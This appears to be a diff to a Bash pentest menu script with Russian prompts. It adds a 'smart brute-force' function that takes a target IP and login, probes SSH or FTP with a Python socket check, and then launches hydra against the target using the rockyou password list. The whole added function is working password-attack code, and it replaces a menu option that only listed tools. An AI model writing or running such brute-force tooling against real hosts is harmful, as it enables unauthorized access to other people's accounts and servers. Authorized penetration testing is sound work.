@@ -85,6 +85,50 @@ except Exception as e:
     fi
 }
 
+# Функция для умного брутфорса
+smart_brute() {
+    read -p "Введите IP цели: " target
+    read -p "Логин (например, root): " login
+    echo -e "${BLUE}[1] SSH (port 22)${NC}"
+    echo -e "${BLUE}[2] FTP (port 21)${NC}"
+    read -p "Выберите протокол: " proto_choice
+
+    case $proto_choice in
+        1) proto="ssh"; port=22 ;;
+        2) proto="ftp"; port=21 ;;
+        *) return ;;
+    esac
+
+    # Проверка порта через Python
+    python3 -c "
+import socket, sys
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    s.connect(('$target', $port))
+    sys.exit(0)
+except:
+    sys.exit(1)
+"
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}[+] Порт $port открыт. Начинаю атаку...${NC}"
+        # Используем стандартный rockyou или просим путь
+        read -p "Путь к словарю (Enter для /usr/share/wordlists/rockyou.txt): " passlist
+        passlist=${passlist:-/usr/share/wordlists/rockyou.txt}
+        
+        hydra -l $login -P $passlist $target $proto -t 4 -V
+        
+        echo -e "${CYAN}-------------------------------------------${NC}"
+        read -p "Если пароль не найден, попробовать другой протокол? (y/n): " retry
+        if [[ "$retry" == "y" ]]; then smart_brute; fi
+    else
+        echo -e "${RED}[-] Порт $port закрыт на этой цели!${NC}"
+        read -p "Попробовать другой протокол на этой же цели? (y/n): " retry
+        if [[ "$retry" == "y" ]]; then smart_brute; fi
+    fi
+}
+
+
 while true; do
     show_menu
     read -p "Опция: " opt
@@ -106,7 +150,7 @@ while true; do
                 read
             fi
             ;;
-        4) echo "Инструменты: john, hydra, hashcat"; sleep 2 ;;
+        4) smart_brute ;;
         5) smart_web_scan ;;
         6) bettercap ;;
         7) 
